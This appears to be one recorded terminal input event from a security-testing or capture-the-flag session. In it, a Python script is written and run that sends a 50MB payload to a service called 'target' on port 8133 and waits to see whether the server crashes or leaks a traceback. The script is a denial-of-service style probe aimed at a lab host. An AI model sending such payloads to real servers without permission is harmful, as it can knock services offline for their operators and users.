[2929.95937, "i", "cat << 'EOF' > test_mem.py\nimport socket\ns = socket.socket()\ns.connect((\"target\", 8133))\ns.recv(1024)\nprint(\"Sending massive payload...\")\n# 50MB payload\ns.sendall(b\"00\" * (5 * 10000000) + b\"\\n\")\nprint(\"Waiting for response...\")\nresp = bytearray()\ntry:\n    # Only wait up to 10 seconds for the server to crash or respond\n    s.settimeout(10.0)\n    while True:\n        chunk = s.recv(65536)\n        if not chunk: break\n        resp.extend(chunk)\nexcept Exception as e:\n    print(\"Exception:\", e)\nres_str = resp.decode('utf-8', 'ignore')\nif \"Traceback\" in res_str:\n    print(res_str)\nelse:\n    print(\"No Traceback found. Response length:\", len(res_str))\ns.close()\nEOF\npython3 test_mem.py\n"]
